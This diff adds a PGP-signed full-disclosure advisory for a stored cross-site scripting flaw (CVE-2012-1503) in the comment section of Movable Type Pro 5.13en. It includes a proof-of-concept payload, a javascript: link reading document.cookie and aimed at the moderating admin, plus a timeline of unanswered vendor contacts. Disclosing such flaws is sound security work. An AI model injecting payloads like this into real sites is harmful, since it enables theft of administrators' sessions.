@@ -1,0 +1,65 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+Source URL: http://www.cloudscan.me/2012/10/cve-2012-1503-movable-type-pro-513en.html
+
+Keywords: CVE-2012-1503, Movable Type Pro 5.13en, Stored XSS,
+JavaScript Injection, Vendor Unresponsive, Full Disclosure
+
+Introduction
+
+Movable Type (MT) started as one of the industries first blogging platforms
+and has developed into an industry leading publishing platform which has
+been used globally for more than 10 years. Movable Type makes it simple to
+manage entire websites, start new blogs, and build an engaged community of
+readers and customers.
+
+Six Apart KK has assumed responsibility over all intellectual property and
+business operations of Movable Type, as well as trademark rights of Six
+Apart. The new Six Apart, a Japanese corporation formerly known as Six
+Apart KK, currently develops, markets and supports Movable Type for a
+global user base, and also operates the company's website
+(www.sixapart.com). The application can be downloaded from URL
+http://www.movabletype.com/download/.
+
+Exploit
+
+Our researchers discovered a persistent XSS vulnerability, allowing an
+attacker to inject arbitrary script code into the comment section of any
+existing Mt5.13en installation. The blog comment is being moderated before
+published; that means an attacker can target the moderating Admin
+(employee) via Javascript Injection.
+
+Exploit Code:
+
+<a href=javascript:alert(document.cookie)>
+X X X X X X X X X X X X X X X<br>
+X X X X X X X X X X X X X X X<br>
+X X X X CLICKME NOW!  X X X X<br>
+X X X X X X X X X X X X X X X<br>
+X X X X X X X X X X X X X X X</a>
+
+Screenshot at URL
+http://www.cloudscan.me/2012/10/cve-2012-1503-movable-type-pro-513en.html
+
+Bug Metrics: CVSS 6.5
+
+Timeline
+
+March 2012 - Email PoC to Vendor via mt-security@sixapart.jp
+April 2012 - No Response from Vendor
+May 2012 - Email PoC to Vendor via mt-security@sixapart.jp
+October 2012 - Full Disclosure
+
+-----BEGIN PGP SIGNATURE-----
+Version: PGP Desktop 10.2.0 (Build 2599)
+Charset: utf-8
+
+wsBVAwUBUIFqUXz+WcLIygj0AQhJ4Af8DaKXqSTGW30YeoLXeq0kUhqXQ0BicpW8
+UZGCMMnlgct7DVh36GIxWc/60WXtuA8nuPqSm7eMKbIrMsvQXPhg9o8MB0LErh49
+e7DY1rZ5hVpq1jVqEEQIyu2bxqS8epFR9/5CSUukGnTwaf4gTna8ZB5UZoRPhLI9
+ih/OKS1L1WZeykUqZB6oSjkc4t3AeS6iYdXZMvkSrwSgnN6iUKBa3lSSzuEzEmfv
+Qhuvb0R6YxNMQafHOr4IlNa/A2rgGBlhYB3P5/wXdAmcnjIhPC4qtH6ik52+NiKQ
+3m5Jr3V2rXVhJRrRwj0ubC4PtfVjIC1YP/k4zY0gA7DOmHhZKk+7Iw==
+=JXEo
+-----END PGP SIGNATURE-----
